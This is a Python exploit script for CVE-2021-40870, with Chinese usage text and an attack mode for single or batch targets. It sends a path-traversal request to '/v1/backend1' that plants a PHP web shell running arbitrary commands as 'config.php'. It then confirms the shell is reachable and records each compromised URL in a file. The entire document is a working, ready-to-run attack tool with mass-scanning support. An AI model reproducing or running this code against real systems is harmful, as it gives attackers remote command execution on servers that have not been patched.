import argparse
import sys
import requests
requests.packages.urllib3.disable_warnings()
success = open("success.txt", "a")


def title():
    print('''
                        cve-2021-40870
            攻击模式：python exp.py -a true -t target_url
            批量模式：python exp.py -s true -f file
    if [*] in result,you can get shell from {base_url}/v1/config.php
                        Author:ying
            ''')


def attack(url):
    global success
    try:
        url = url + "/"
        filename = "config.php"
        shell = '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''
        headers = {
            "Host": url[8:-1],
            "User-Agent": '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36''',
            "Connection": "close",
            "Content-Length": "109",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip",
        }
        body = f'CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/{filename}&data=123{shell}'
        r = requests.post(url + '/v1/backend1', headers=headers, data=body, verify=False,timeout=3)
        check_file = requests.get(url + '/v1/' + filename, verify=False, timeout=3)
        if check_file.status_code == 200:
            success.write(url)
            print("[*] "+url)
        else:
            print("[-] "+url)
    except Exception as err:
        print(err)


def scan(file):
    for url_link in open(file, 'r', encoding='utf-8'):
        if url_link.strip() != '':
            url_path = format_url(url_link.strip())
            attack(url_path)


def format_url(url):
    try:
        if url[:4] != "http" and url[:5] != "https":
            url = "http://" + url
        elif url[:4] != "http":
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))


def main():
    parser = argparse.ArgumentParser(description='cve-2021-40870')
    parser.add_argument('-a', '--attack', type=bool, help='攻击模式 ')
    parser.add_argument('-t', '--target', type=str, help='目标URL ')
    parser.add_argument('-s', '--scan', type=bool, help='批量模式 ')
    parser.add_argument('-f', '--file', type=str, help='文件路径 ')
    args = parser.parse_args()
    attack_model = args.attack
    target_url = args.target
    scan_model = args.scan
    file = args.file

    if attack_model is True and target_url is not None:
        attack(target_url)
    elif scan_model is True and file is not None:
        scan(file)
    else:
        sys.exit(0)


if __name__ == '__main__':
    title()
    main()
